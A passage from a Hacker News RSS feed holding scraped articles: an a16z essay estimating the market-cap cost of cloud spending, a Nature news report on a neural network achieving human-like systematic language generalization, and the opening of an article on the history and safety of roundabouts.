the <a href="https://github.com/helix-editor/helix/blob/master/CHANGELOG.md#2310-2023-10-24">changelog</a> for the full details.</p>
<p>Come chat about usage and development questions in the <a href="https://matrix.to/#/#helix-community:matrix.org">Matrix space</a>
and follow along with Helix's development in the <a href="https://github.com/helix-editor/helix/">GitHub repository</a>.</p>






    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The cost of cloud, a trillion dollar paradox (2021) (150 pts)]]></title>
            <link>https://a16z.com/the-cost-of-cloud-a-trillion-dollar-paradox/</link>
            <guid>38017239</guid>
            <pubDate>Wed, 25 Oct 2023 19:37:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://a16z.com/the-cost-of-cloud-a-trillion-dollar-paradox/">https://a16z.com/the-cost-of-cloud-a-trillion-dollar-paradox/</a>, See on <a href="https://news.ycombinator.com/item?id=38017239">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                            <p>There is no doubt that the cloud is one of the most significant platform shifts in the history of computing. Not only has cloud already impacted hundreds of billions of dollars of IT spend, it’s still in early innings and growing rapidly on a base of over $<a href="https://www.gartner.com/en/newsroom/press-releases/2020-07-23-gartner-forecasts-worldwide-public-cloud-revenue-to-grow-6point3-percent-in-2020#:~:text=The%20worldwide%20public%20cloud%20services,%2C%20according%20to%20Gartner%2C%20Inc" target="_blank" rel="noopener">100B</a> of annual public cloud spend. This shift is driven by an incredibly powerful value proposition—infrastructure available immediately, at exactly the scale needed by the business—driving efficiencies both in operations and economics. The cloud also helps cultivate innovation as company resources are freed up to focus on new products and growth.</p>

<p>However, as industry experience with the cloud matures—and we see a more complete picture of cloud lifecycle on a company’s economics—it’s becoming evident that while cloud clearly delivers on its promise<em> early</em> on in a company’s journey, the pressure it puts on margins can start to outweigh the benefits, as a company scales and growth slows. Because this shift happens<em> later</em> in a company’s life, it is difficult to reverse as it’s a result of years of development focused on new features, and not infrastructure optimization. Hence a rewrite or the significant restructuring needed to dramatically improve efficiency can take years, and is often considered a non-starter.</p>
<p>Now, there is a growing awareness of the long-term cost implications of cloud. As the cost of cloud starts to contribute significantly to the total cost of revenue (COR) or cost of goods sold (COGS), some companies have taken the dramatic step of “repatriating” the majority of workloads (as in the example of Dropbox) or in other cases adopting a hybrid approach (as with CrowdStrike and Zscaler). Those who have done this have reported significant cost savings: In 2017, Dropbox detailed in its <a href="https://www.sec.gov/Archives/edgar/data/1467623/000119312518055809/d451946ds1.htm" target="_blank" rel="noopener">S-1</a> a whopping $75M in cumulative savings over the two years prior to IPO due to their infrastructure optimization overhaul, the majority of which entailed repatriating workloads from public cloud.</p>
<p>Yet most companies find it hard to justify moving workloads off the cloud given the sheer magnitude of such efforts, and quite frankly the dominant, somewhat singular, industry narrative that “cloud is great”. (It is, but we need to consider the broader impact, too.) Because when evaluated relative to the scale of potentially lost market capitalization—which we present in this post—the calculus changes. As growth (often) slows with scale, near term efficiency becomes an increasingly key determinant of value in public markets. The excess cost of cloud weighs heavily on market cap by driving lower profit margins.</p>
<p>The point of this post isn’t to argue for repatriation, though; that’s an incredibly complex decision with broad implications that vary company by company. Rather, we take an initial step in understanding just how much market cap is being suppressed by the cloud, so we can help inform the decision-making framework on managing infrastructure as companies scale.</p>
<p>To frame the discussion: We estimate the recaptured savings in the extreme case of full repatriation, and use public data to pencil out the impact on share price. We show (using relatively conservative assumptions!) that <em>across 50 of the top public software companies</em> currently utilizing cloud infrastructure, an estimated $100B of market value is being lost among them due to cloud impact on margins— relative to running the infrastructure themselves. And while we focus on software companies in our analysis, the impact of the cloud is by no means limited to software. Extending this analysis to the broader universe of scale public companies that stands to benefit from related savings, we estimate that the total impact is potentially greater than $500B.</p>
<p>Our analysis highlights how much value can be gained through cloud optimization—whether through system design and implementation, re-architecture, third-party cloud efficiency solutions, or moving workloads to special purpose hardware. This is a very counterintuitive assumption in the industry given prevailing narratives around cloud vs. on-prem. However, it’s clear that when you factor in the impact to market cap in addition to near term savings, <em>scaling companies can justify nearly any level of work that will help keep cloud costs low.</em></p>
<h3><strong>Unit economics of cloud repatriation: The case of Dropbox, and beyond</strong></h3>
<p>To dimensionalize the cost of cloud, and understand the magnitude of potential savings from optimization, let’s start with a more extreme case of large scale cloud repatriation: Dropbox. When the company embarked on its infrastructure optimization initiative in 2016, they saved nearly $75M over two years by shifting the majority of their workloads from public cloud to “lower cost, custom-built infrastructure in co-location facilities” directly leased and operated by Dropbox. Dropbox gross margins increased from 33% to 67%&nbsp; from 2015 to 2017, which they <a href="https://www.sec.gov/Archives/edgar/data/1467623/000119312518055809/d451946ds1.htm" target="_blank" rel="noopener">noted</a> was “primarily due to our Infrastructure Optimization and an… increase in our revenue during the period.”</p>

<p>But that’s just Dropbox. So to help generalize the potential savings from cloud repatriation to a broader set of companies, Thomas Dullien, former Google engineer and co-founder of cloud computing optimization company Optimyze, estimates that repatriating $100M of annual public cloud spend can translate to roughly <em>less than half </em>that amount in all-in annual total cost of ownership (TCO)—from server racks, real estate, and cooling to network and engineering costs.</p>
<p>The exact savings obviously varies company, but several experts we spoke to converged on this “formula”: <em>Repatriation results in one-third to one-half the cost of running equivalent workloads in the cloud</em>. Furthermore, a director of engineering at a large consumer internet company found that public cloud list prices can be 10 to 12x the cost of running one’s own data centers. Discounts driven by use-commitments and volume are common in the industry, and can bring this multiple down to single digits, since cloud compute typically drops by ~30-50% with committed use. But AWS still operates at a roughly 30% blended operating margin net of these discounts and an aggressive R&amp;D budget—implying that potential company savings due to repatriation are larger. The performance lift from managing one’s own hardware may drive even further gains.</p>
<p>Across all our conversations with diverse practitioners, the pattern has been remarkably consistent:<em> If you’re operating at scale, the cost of cloud can at least double your infrastructure bill. </em></p>
<h3><strong>The true cost of cloud</strong></h3>
<p>When you consider the sheer magnitude of cloud spend as a percentage of the total cost of revenue (COR), 50% savings from cloud repatriation is particularly meaningful. Based on benchmarking public software companies (those that disclose their committed cloud infrastructure spend), we found that contractually committed spend averaged 50% of COR.</p>
<p>Actual spend as a percentage of COR is typically even higher than committed spend: A billion dollar private software company told us that their public cloud spend amounted to 81% of COR, and that “cloud spend ranging from 75 to 80% of cost of revenue was common among software companies”. Dullien observed (from his time at both industry leader Google and now Optimyze) that companies are often conservative when sizing cloud commit size, due to fears of being overcommitted on spend, so they commit to only their baseline loads. So, as a rule of thumb, committed spend is often typically ~20% lower than actual spend… elasticity cuts both ways. Some companies we spoke with reported that they exceeded their committed cloud spend forecast by at least 2X.</p>
<p>If we extrapolate these benchmarks across the broader universe of software companies that utilize some public cloud for infrastructure, our back-of-the-envelope estimate is that the cloud bill reaches $8B in aggregate for 50 of the top publicly traded software companies (that reveal some degree of cloud spend in their annual filings). While some of these companies take a hybrid approach—public cloud <em>and</em> on-premise (which means cloud spend may be a lower percentage of COR relative to our benchmarks)—our analysis balances this, by assuming that committed spend equals actual spend across the board. Drawing from our conversations with experts, we assume that cloud repatriation drives a 50% reduction in cloud spend, resulting in total savings of $4B in recovered profit. For the broader universe of scale public software and consumer internet companies utilizing cloud infrastructure, this number is likely much higher.</p>
<div id="attachment_306515"><p><a href="https://a16z.com/wp-content/uploads/2021/05/cloud-spend-as_percent_of_COR_a16z-scaled.jpg"><img aria-describedby="caption-attachment-306515" decoding="async" src="https://a16z.com/wp-content/uploads/2023/04/cloud-spend-as_percent_of_COR_a16z-1024x491.jpg" alt="" width="1024" height="491"></a></p><p id="caption-attachment-306515"><em>source: company S-1 and 10K filings; a16z analysis</em></p></div>
<p>While $4B of estimated net savings is staggering on its own, this number becomes even more eye-opening when translated to <em>unlocked market capitalization</em>. Since all companies are conceptually valued as the present value of their future cash flows, realizing these aggregate annual net savings results in market capitalization creation well over that $4B.</p>
<p>How much more? One rough proxy is to look at how the public markets value additional gross profit dollars: High-growth software companies that are still burning cash are often valued on gross profit multiples, which reflects assumptions about the company’s long term growth and profitable margin structure. (Commonly referenced revenue multiples also reflect a company’s long term profit margin, which is why they tend to increase for higher gross margin businesses even on a growth rate-adjusted basis). Both capitalization multiples, however, serve as a heuristic for estimating the market discounting of a company’s future cash flows.</p>
<p>Among the set of 50 public software companies we analyzed, the average total enterprise value to 2021E gross profit multiple (based on CapIQ at time of publishing) is 24-25X. In other words: For every dollar of gross profit saved, market caps rise on average 24-25X the net cost savings from cloud repatriation. (Assumes savings are expressed net of depreciation costs incurred from incremental CapEx if relevant).</p>
<p>This means an additional $4B of gross profit can be estimated to yield an additional $100B of market capitalization among these 50 companies alone. Moreover, since using a gross profit multiple (vs. a free cash flow multiple) assumes that incremental gross profit dollars are also associated with certain incremental operating expenditures, this approach may underestimate the impact to market capitalization from the $4B of annual net savings.</p>
<p>For a given company, the impact may be even higher depending on its specific valuation. To illustrate this phenomenon [please note this is not investment advice, see full disclosures below and at <a href="https://a16z.com/disclosures/">https://a16z.com/disclosures/</a>], take the example of <span>infrastructure monitoring as a service company </span>Datadog. The company traded at close to 40X 2021 estimated gross profit at time of publishing, and disclosed an aggregate $225M 3-year commitment to AWS in their S-1. If we annualize committed spend to $75M of annual AWS costs—and assume 50% or $37.5M of this may be recovered via cloud repatriation—this translates to roughly $1.5B of market capitalization for the company on committed spend reductions alone!</p>
<p>While back-of-the-envelope analyses like these are never perfect, the directional findings are clear: market capitalizations of scale public software companies are weighed down by cloud costs, and <em>by hundreds of billions of dollars</em>. If we expand to the broader universe of enterprise software and consumer internet companies, this number is likely over $500B—assuming 50% of overall cloud spend is consumed by scale technology companies that stand to benefit from cloud repatriation.</p>
<p>For business leaders, industry analysts, and builders, it’s simply too expensive to ignore the impact on market cap when making both long-term <em>and</em> even near-term infrastructure decisions.</p>
<div id="attachment_306516"><p><a href="https://a16z.com/wp-content/uploads/2021/05/gross-margin-v-growth-adjusted-revenue-multiples_a16z-scaled.jpg"><img aria-describedby="caption-attachment-306516" decoding="async" loading="lazy" src="https://a16z.com/wp-content/uploads/2023/04/gross-margin-v-growth-adjusted-revenue-multiples_a16z-1024x710.jpg" alt="" width="1024" height="710"></a></p><p id="caption-attachment-306516"><em>source: CapIQ as of May 2021; note: charts herein are for informational purposes only and should not be relied upon when making any investment decision</em></p></div>
<h3><strong>The paradox of cloud</strong></h3>
<p>Where do we go from here? On one hand, it is a major decision to start moving workloads off of the cloud. For those who have not planned in advance, the necessary rewriting seems SO impractical as to be impossible; any such undertaking requires a strong infrastructure team that may not be in place. And all of this requires building expertise beyond one’s core, which is not only distracting, but can itself detract from growth. Even at scale, the cloud retains many of its benefits—such as on-demand capacity, and hordes of existing services to support new projects and new geographies.</p>
<p>But on the other hand, we have the phenomenon we’ve outlined in this post, where the cost of cloud “takes over” at some point, locking up hundreds of billions of market cap that are now stuck in this paradox: <em>You’re crazy if you don’t start in the cloud; you’re crazy if you stay on it.</em></p>
<p>So what can companies do to free themselves from this paradox? As mentioned, we’re not making a case for repatriation one way or the other; rather, we’re pointing out that <em>infrastructure spend should be a first-class metric</em>. What do we mean by this? That companies need to optimize early, often, and, sometimes, also outside the cloud. When you’re building a company at scale, there’s little room for religious dogma.</p>
<p>While there’s much more to say on the mindset shifts and best practices here—especially as the full picture has only more recently emerged—here are a few considerations that may help companies grapple with the ballooning cost of cloud.</p>
<p><strong>Cloud spend as a KPI. </strong>Part of making infrastructure a first-class metric is making sure it is a key performance indicator for the business. Take for example Spotify’s Cost Insights, a homegrown <a href="https://redmonk.com/jgovernor/2021/04/28/shifting-cost-optimisation-left-spotify-backstage-cost-insights/" target="_blank" rel="noopener">tool that tracks</a> cloud spend. By tracking cloud spend, the company enables engineers, and not just finance teams, to take ownership of cloud spend. Ben Schaechter, formerly at Digital Ocean, now co-founder and CEO of Vantage, observed that not only have they been seeing companies across the industry look at cloud cost metrics alongside core performance and reliability metrics earlier in the lifecycle of their business, but also that “Developers who have been burned by surprise cloud bills are becoming more savvy and expect more rigor with their team’s approach to cloud spend.”</p>
<p><strong>Incentivize the right behaviors.</strong> Empowering engineers with data from first-class KPIs for infrastructure takes care of awareness, but doesn’t take care of incentives to change the way things are done. A prominent industry CTO told us that at one of his companies, they put in short-term incentives like those used in sales (SPIFFs), so that any engineer who saved a certain amount of cloud spend by optimizing or shutting down workloads received a spot bonus (which still had a high company ROI since the savings were recurring). He added that this approach—basically, “tie the pain directly to the folks who can fix the problem”—actually cost them less, because it paid off 10% of the entire organization, and brought down overall spend by $3M in just six months. Notably, the company CFO was key to endorsing this non-traditional model.</p>
<p><strong>Optimization, optimization, optimization. </strong>When evaluating the value of any business, one of the most important factors is the cost of goods sold or COGS—and for every dollar that a business makes, how many dollars does it cost to deliver? Customer data platform company Segment <a href="https://segment.com/blog/the-10m-engineering-problem/" target="_blank" rel="noopener">recently shared</a> how they reduced infrastructure costs by 30% (while simultaneously increasing traffic volume by 25% over the same period) through incremental optimization of their infrastructure decisions. There are a number of third-party optimization tools that can provide quick gains to existing systems, ranging anywhere from 10-40% in our experience observing this space.</p>
<p><strong>Think about repatriation up front. </strong>Just because the cloud paradox exists—where cloud is cheaper and better early on and more costly later in a company’s evolution—exists, doesn’t mean a company has to passively accept it without planning for it. Make sure your system architects are aware of the potential for repatriation early on, because by the time cloud costs start to catch up to or even outpace revenue growth, it’s too late. Even modest or more modular architectural investment early on—including architecting to be able to move workloads to the optimal location and not get locked in—reduces the work needed to repatriate workloads in the future. The popularity of Kubernetes and the <a href="https://a16z.com/containers/" target="_blank" rel="noopener">containerization</a> of software, which makes workloads more portable, was in part a reaction to companies not wanting to be locked into a specific cloud.</p>
<p><strong>Incrementally repatriate.</strong> There’s also no reason that repatriation (if that’s indeed the right move for your business), can’t be done incrementally, and in a hybrid fashion. We need more nuance here beyond either/or discussions: for example, repatriation likely only makes sense for a subset of the most resource-intensive workloads. It doesn’t have to be all or nothing! In fact, of the many companies we spoke with, even the most aggressive take-back-their-workloads ones still retained 10 to 30% or more in the cloud.</p>
<p>While these recommendations are focused on SaaS companies, there are also other things one can do; for instance, if you’re an infrastructure vendor, you may want to consider options for passing through costs—like using the customer’s cloud credits—so that the cost stays off your books. The entire ecosystem needs to be thinking about the cost of cloud.</p>
<p><strong>*&nbsp; &nbsp; &nbsp;*&nbsp; &nbsp; &nbsp;*</strong></p>
<p>How the industry got here is easy to understand: The cloud is the perfect platform to optimize for innovation, agility, and growth. And in an industry fueled by private capital, margins are often a secondary concern. That’s why new projects tend to start in the cloud, as companies prioritize velocity of feature development over efficiency.</p>
<p>But now, we know. The long term implications have been less well understood—which is ironic given that over 60% of companies <a href="https://datometry.com/blog/moving-to-the-cloud-survey-analysis/" target="_blank" rel="noopener">cite</a> <em>cost savings</em> as the very reason to move to the cloud in the first place! For a new startup or a new project, the cloud is the obvious choice. And it is certainly worth paying even a moderate “flexibility tax” for the nimbleness the cloud provides.</p>
<p>The problem is, for large companies—including startups as they reach scale—that tax equates to hundreds of billions of dollars of equity value in many cases… and is levied well after the companies have already, deeply committed themselves to the cloud (and are often too entrenched to extricate themselves). Interestingly, one of the most commonly cited reasons to move the cloud early on—a large up-front capital outlay (CapEx)—is no longer required for repatriation. Over the last few years, alternatives to public cloud infrastructures have evolved significantly and can be built, deployed, and managed entirely via operating expenses (OpEx) instead of capital expenditures.</p>
<p>Note too that as large as some of the numbers we shared here seem, we were actually conservative in our assumptions. Actual spend is often higher than committed, and we didn’t account for overages-based elastic pricing. The actual drag on industry-wide market caps is likely far higher than penciled.</p>
<p>Will the 30% margins currently enjoyed by cloud providers eventually winnow through competition and change the magnitude of the problem? Unlikely, given that the majority of cloud spend is currently directed toward an oligopoly of three companies. And here’s a bit of dramatic irony: Part of the reason Amazon, Google, and Microsoft—representing a combined ~5 trillion dollar market cap—are all buffeted from the competition, is that they have high profit margins driven in part by running their own infrastructure, enabling ever greater reinvestment into product and talent while buoying their own share prices.</p>
<p>And so, with hundreds of billions of dollars in the balance, this paradox will likely resolve one way or the other: either the public clouds will start to give up margin, or, they’ll start to give up workloads. Whatever the scenario, perhaps the largest opportunity in infrastructure right now is sitting somewhere between cloud hardware and the unoptimized code running on it.</p>
<p><em>Acknowledgements: We’d like to thank everyone who spoke with us for this article (including those named above), sharing their insights from the frontlines.&nbsp;</em></p>
<div id="attachment_306518"><p><a href="https://a16z.com/wp-content/uploads/2021/05/cloud-paradox-companies-appendix_a16z-scaled.jpg"><img aria-describedby="caption-attachment-306518" decoding="async" loading="lazy" src="https://a16z.com/wp-content/uploads/2023/04/cloud-paradox-companies-appendix_a16z-1024x677.jpg" alt="" width="1024" height="677"></a></p><p id="caption-attachment-306518"><em>Companies selected denoted some degree of public cloud infrastructure utilization in 10Ks</em></p></div>
                        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI 'breakthrough': neural net has human-like ability to generalize language (191 pts)]]></title>
            <link>https://www.nature.com/articles/d41586-023-03272-3</link>
            <guid>38017146</guid>
            <pubDate>Wed, 25 Oct 2023 19:28:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/d41586-023-03272-3">https://www.nature.com/articles/d41586-023-03272-3</a>, See on <a href="https://news.ycombinator.com/item?id=38017146">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                    <figure>
 <picture>
  <source type="image/webp" srcset="https://media.nature.com/lw767/magazine-assets/d41586-023-03272-3/d41586-023-03272-3_26220188.jpg?as=webp 767w, https://media.nature.com/lw319/magazine-assets/d41586-023-03272-3/d41586-023-03272-3_26220188.jpg?as=webp 319w" sizes="(max-width: 319px) 319px, (min-width: 1023px) 100vw,  767px">
  <img alt="An chalkboard illustration of two figures communicating and understanding each other." loading="lazy" src="https://media.nature.com/lw767/magazine-assets/d41586-023-03272-3/d41586-023-03272-3_26220188.jpg">
  <figcaption>
   <p><span>A version of the human ability to apply new vocabulary in flexible ways has been achieved by a neural network.</span><span>Credit: marrio31/Getty</span></p>
  </figcaption>
 </picture>
</figure><p>Scientists have created a neural network with the human-like ability to make generalizations about language<sup><a href="#ref-CR1" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">1</a></sup>. The artificial intelligence (AI) system performs about as well as humans at folding newly learned words into an existing vocabulary and using them in fresh contexts, which is a key aspect of human cognition known as systematic generalization.</p><p>The researchers gave the same task to the AI model that underlies the chatbot <a href="https://www.nature.com/articles/d41586-023-00340-6" data-track="click" data-label="https://www.nature.com/articles/d41586-023-00340-6" data-track-category="body text link">ChatGPT</a>, and found that it performs much worse on such a test than either the new neural net or people, despite the chatbot’s <a href="https://www.nature.com/articles/d41586-023-00758-y" data-track="click" data-label="https://www.nature.com/articles/d41586-023-00758-y" data-track-category="body text link">uncanny ability to converse</a> in a human-like manner.</p><p>The work, published on 25 October in <i>Nature</i>, could lead to machines that interact with people more naturally than do even the best AI systems today. Although systems based on large language models, such as ChatGPT, are adept at conversation in many contexts, <a href="https://www.nature.com/articles/d41586-023-02361-7" data-track="click" data-label="https://www.nature.com/articles/d41586-023-02361-7" data-track-category="body text link">they display glaring gaps and inconsistencies in others</a>.</p><p>The neural network’s human-like performance suggests there has been a “breakthrough in the ability to train networks to be systematic”, says Paul Smolensky, a cognitive scientist who specializes in language at Johns Hopkins University in Baltimore, Maryland.</p><h2>Language lessons</h2><p>Systematic generalization is demonstrated by people’s ability to effortlessly use newly acquired words in new settings. For example, once someone has grasped the meaning of the word ‘photobomb’, they will be able to use it in a variety of situations, such as ‘photobomb twice’ or ‘photobomb during a Zoom call’. Similarly, someone who understands the sentence ‘the cat chases the dog’ will also understand ‘the dog chases the cat’ without much extra thought.</p><p>But this ability does not come innately to neural networks, a method of emulating human cognition that has dominated artificial-intelligence research, says Brenden Lake, a cognitive computational scientist at New York University and co-author of the study. Unlike people, neural nets struggle to use a new word until they have been trained on many sample texts that use that word. Artificial-intelligence researchers have sparred for nearly 40 years as to whether neural networks could ever be a plausible model of human cognition if they cannot demonstrate this type of systematicity.</p><article data-label="Related">
  <a href="https://www.nature.com/articles/d41586-022-01921-7" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-023-03272-3/d41586-023-03272-3_26213144.jpg"><p>Title not specified</p></a>
 </article><p>To attempt to settle this debate, the authors first tested 25 people on how well they deploy newly learnt words to different situations. The researchers ensured the participants would be learning the words for the first time by testing them on a pseudo-language consisting of two categories of nonsense words. ‘Primitive’ words such as ‘dax,’ ‘wif’ and ‘lug’ represented basic, concrete actions such as ‘skip’ and ‘jump’. More abstract ‘function’ words such as ‘blicket’, ‘kiki’ and ’fep’ specified rules for using and combining the primitives, resulting in sequences such as ‘jump three times’ or ‘skip backwards’.</p><p>Participants were trained to link each primitive word with a circle of a particular colour, so a red circle represents ‘dax’, and a blue circle represents ‘lug’. The researchers then showed the participants combinations of primitive and function words alongside the patterns of circles that would result when the functions were applied to the primitives. For example, the phrase ‘dax fep’ was shown with three red circles, and ‘lug fep’ with three blue circles, indicating that fep denotes an abstract rule to repeat a primitive three times.</p><p>Finally, the researchers tested participants’ ability to apply these abstract rules by giving them complex combinations of primitives and functions. They then had to select the correct colour and number of circles and place them in the appropriate order.</p><h2>Cognitive benchmark</h2><p>As predicted, people excelled at this task; they chose the correct combination of coloured circles about 80% of the time, on average. When they did make errors, the researchers noticed that these followed a pattern that reflected known human biases.</p><p>Next, the researchers trained a neural network to do a task similar to the one presented to participants, by programming it to learn from its mistakes. This approach allowed the AI to learn as it completed each task rather than using a static data set, which is the standard approach to training neural nets. To make the neural net human-like, the authors trained it to reproduce the patterns of errors they observed in humans’ test results. When the neural net was then tested on fresh puzzles, its answers corresponded almost exactly to those of the human volunteers, and in some cases exceeded their performance.</p><article data-label="Related">
  <a href="https://www.nature.com/immersive/d41586-023-02822-z/index.html" data-track="click" data-track-label="recommended article"><img alt="" src="https://media.nature.com/w400/magazine-assets/d41586-023-03272-3/d41586-023-03272-3_26213232.jpg"><p>A test of artificial intelligence</p></a>
 </article><p>By contrast, GPT-4 struggled with the same task, failing, on average, between 42 and 86% of the time, depending on how the researchers presented the task. “It’s not magic, it’s practice,” Lake says. “Much like a child also gets practice when learning their native language, the models improve their compositional skills through a series of compositional learning tasks.”</p><p>Melanie Mitchell, a computer and cognitive scientist at the Santa Fe Institute in New Mexico, says this study is an interesting proof of principle, but it remains to be seen if this training method can scale up to generalize across a much larger data set or even to images. Lake hopes to tackle this problem by studying how people develop a knack for systematic generalization from a young age, and incorporating those findings to build a more robust neural net.</p><p>Elia Bruni, a specialist in natural language processing at the University of Osnabrück in Germany, says this research could make neural networks more-efficient learners. This would reduce the gargantuan amount of data necessary to train systems such as ChatGPT and would minimize ‘hallucination’, which occurs when AI perceives patterns that are non-existent and creates inaccurate outputs. “Infusing systematicity into neural networks is a big deal,” Bruni says. “It could tackle both these issues at the same time.”</p>
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Safety benefits of roundabouts (169 pts)]]></title>
            <link>https://theconversation.com/what-are-roundabouts-a-transportation-engineer-explains-the-safety-benefits-of-these-circular-intersections-215412</link>
            <guid>38017049</guid>
            <pubDate>Wed, 25 Oct 2023 19:20:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://theconversation.com/what-are-roundabouts-a-transportation-engineer-explains-the-safety-benefits-of-these-circular-intersections-215412">https://theconversation.com/what-are-roundabouts-a-transportation-engineer-explains-the-safety-benefits-of-these-circular-intersections-215412</a>, See on <a href="https://news.ycombinator.com/item?id=38017049">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>If you live on the East Coast, you may have driven through roundabouts in your neighborhood countless times. Or maybe, if you’re in some parts farther west, you’ve never encountered one of these intersections. But roundabouts, while a relatively new traffic control measure, are <a href="https://www.washingtonpost.com/business/2022/11/25/roundabout-revolution-traffic-circles/">catching on across the United States</a>.</p>

<p>Roundabouts, also known as traffic circles or rotaries, are <a href="https://highways.dot.gov/safety/intersection-safety/intersection-types/roundabouts">circular intersections</a> designed to improve traffic flow and safety. They offer several advantages over conventional intersections controlled by traffic signals or stop signs, but by far the most important one is safety. </p>

<figure>
            <a href="https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=1000&amp;fit=clip"><p><img alt="A bird's-eye view of a roundabout, with a pink circular center with grass in the middle, and four roads converging from north, south, east and west." data-src="https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=754&amp;fit=clip" data-srcset="https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=600&amp;h=400&amp;fit=crop&amp;dpr=1 600w, https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=30&amp;auto=format&amp;w=600&amp;h=400&amp;fit=crop&amp;dpr=2 1200w, https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=15&amp;auto=format&amp;w=600&amp;h=400&amp;fit=crop&amp;dpr=3 1800w, https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=754&amp;h=503&amp;fit=crop&amp;dpr=1 754w, https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=30&amp;auto=format&amp;w=754&amp;h=503&amp;fit=crop&amp;dpr=2 1508w, https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=15&amp;auto=format&amp;w=754&amp;h=503&amp;fit=crop&amp;dpr=3 2262w" sizes="(min-width: 1466px) 754px, (max-width: 599px) 100vw, (min-width: 600px) 600px, 237px" src="https://images.theconversation.com/files/555403/original/file-20231023-29-a5mlzl.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=754&amp;fit=clip"></p></a>
            <figcaption>
              <span>Modern roundabouts can have one or two lanes, and usually have four exit options.</span>
              <span><a href="https://newsroom.ap.org/detail/2020CensusChallenges/f7a70b19f0c9416b85a99e19b874cf1f/photo?Query=roundabout&amp;mediaType=photo&amp;sortBy=&amp;dateRange=Anytime&amp;totalCount=194&amp;currentItemNo=2&amp;vs=true&amp;vs=true">AP Photo/Alex Slitz</a></span>
            </figcaption>
          </figure>

<p><a href="https://udayton.edu/engineering/research/research-labs/transportation-group/index.php">I research transportation engineering</a>, particularly traffic safety and traffic operations. <a href="https://udayton.edu/engineering/research/research-labs/transportation-group/research.php">Some of my past studies</a> have examined the safety and operational effects of installing roundabouts at an intersection. I’ve also compared the performance of roundabouts versus stop-controlled intersections. </p>

<h2>A brief history of roundabouts</h2>

<p>As early as the 1700s, some city planners proposed and even constructed circular places, sites where roads converged, like <a href="https://www.discoveringbritain.org/activities/south-west-england/aerial/britain-from-the-air-bath-circus.html">the Circus</a> in Bath, England, and the <a href="https://en.wikipedia.org/wiki/Place_Charles_de_Gaulle">Place Charles de Gaulle</a> in France. In the U.S., architect Pierre L'Enfant <a href="https://science.howstuffworks.com/engineering/civil/roundabouts1.htm">built several into his design for Washington, D.C.</a>. These circles were the predecessors to roundabouts.</p>

<p>In 1903, French architect and influential urban planner Eugène Hénard was one of the first people who <a href="https://www.rutgersuniversitypress.org/9780813526911/ways-of-the-world/">introduced the idea</a> of <a href="https://highways.dot.gov/public-roads/autumn-1995/roundabouts-direct-way-safer-highways">moving traffic in a circle</a> to control <a href="https://trid.trb.org/view/458975">busy intersections in Paris</a>. </p>

<p>Around the same time, <a href="https://enotrans.org/the-life-of-eno/">William Phelps Eno</a>, an American businessman known as the father of traffic safety and control, also proposed roundabouts to alleviate <a href="https://trid.trb.org/view/458975">traffic congestion in New York City</a>. </p>

<p>In the years that followed, a few other cities tried out a roundabout-like design, with <a href="https://www.bridlevehicleleasing.co.uk/blog/why-doesnt-america-have-roundabouts">varying levels of success</a>. These roundabouts didn’t have any sort of standardized design guidelines, and most of them were too large to be effective and efficient, as vehicles would enter at higher speeds without always yielding. </p>

<p>The <a href="https://highways.dot.gov/public-roads/autumn-1995/roundabouts-direct-way-safer-highways">birth of the modern roundabout</a> came with yield-at-entry regulations, adopted in some towns in Great Britain in the 1950s. With yield-at-entry regulations, the vehicles entering the roundabout had to give way to vehicles already circulating in the roundabout. This was made a rule nationwide in the United Kingdom in 1966, then in France in 1983.</p>

<p>Yield-at-entry meant vehicles drove through these modern roundabouts more slowly, and over the years, engineers began adding more features that made them look closer to how roundabouts do now. Many added pedestrian crossings and splitter islands – or raised curbs where vehicles entered and exited – which <a href="https://highways.dot.gov/public-roads/autumn-1995/roundabouts-direct-way-safer-highways">controlled the vehicles’ speeds</a>.</p>

<p>Engineers, planners and decision-makers worldwide noticed that these roundabouts improved traffic flow, reduced congestion and improved safety at intersections. Roundabouts then spread <a href="https://www.bridlevehicleleasing.co.uk/blog/why-doesnt-america-have-roundabouts">throughout Europe and Australia</a>. </p>

<p>Three decades later, modern roundabouts came to North America. The <a href="https://highways.dot.gov/public-roads/autumn-1995">first modern roundabout</a> in the U.S. was built in <a href="https://www.8newsnow.com/news/local-news/highlighting-the-first-modern-roundabouts-in-the-country-during-national-roundabout-week/">Summerlin, on the west side of Las Vegas</a>, in 1990. </p>

<figure>
            <p><iframe data-src="https://www.youtube.com/embed/46mOPz3rhHs?wmode=transparent&amp;start=0" frameborder="0" allowfullscreen="" width="100%" height="400"></iframe></p>
            <figcaption><span>Roundabouts require the driver to yield before entering and signal before exiting.</span></figcaption>
          </figure>

<p>Ever since, the construction of modern roundabouts in the U.S. has picked up steam. There are now about <a href="https://roundabouts.kittelson.com/">10,000 roundabouts in the country</a>. </p>

<h2>Why use roundabouts?</h2>

